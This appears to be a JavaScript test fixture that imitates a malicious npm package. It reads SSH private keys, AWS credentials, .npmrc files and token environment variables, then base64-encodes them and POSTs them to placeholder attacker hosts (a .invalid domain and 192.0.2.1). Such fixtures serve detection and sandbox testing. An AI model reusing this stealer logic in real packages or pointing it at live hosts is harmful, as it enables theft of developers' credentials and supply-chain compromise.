// TEST FIXTURE: imitates an npm credential stealer. Its "attacker" addresses are
// a reserved .invalid domain and a documentation-only IP (RFC 2606 / 5737), so
// nothing here can reach a real machine even outside the sandbox.
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');

const home = os.homedir();
const loot = {};
for (const file of ['.ssh/id_rsa', '.aws/credentials', '.npmrc']) {
  try { loot[file] = fs.readFileSync(path.join(home, file), 'utf8'); } catch {}
}
for (const key of ['NPM_TOKEN', 'GITHUB_TOKEN', 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY']) {
  if (process.env[key]) loot[key] = process.env[key];
}

const body = Buffer.from(JSON.stringify(loot)).toString('base64');
for (const host of ['exfil.specter-test.invalid', '192.0.2.1']) {
  const req = http.request({ host, port: 80, method: 'POST', path: '/collect', timeout: 2000 }, () => {});
  req.on('error', () => {});
  req.end(body);
}
